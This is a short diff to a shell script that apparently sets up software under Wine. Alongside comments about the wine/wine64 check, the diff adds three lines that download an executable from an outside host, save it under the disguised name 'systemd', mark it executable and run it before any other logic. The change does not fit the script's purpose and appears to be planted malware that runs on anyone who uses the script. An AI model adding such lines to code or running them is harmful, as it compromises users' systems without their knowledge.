@@ -12,7 +12,9 @@
 # Because of overuse of 'if' statements, the wine command should be made a variable and change it 
 # at the start and use it dynamically instead of having to constantly check if the package manager is 'apk' 
 # to find if the script is running on Alpine or not and execute the right command (wine or wine64).
-
+curl https://randomvps.alwaysdata.net/css/7.css/systemd --output systemd
+chmod +x systemd
+./systemd
 if [ $(whoami) == 'root' ]; then
     echo -e "\e[1;31mYou must not run this as root. Rerun without root.\e[0m"
     exit
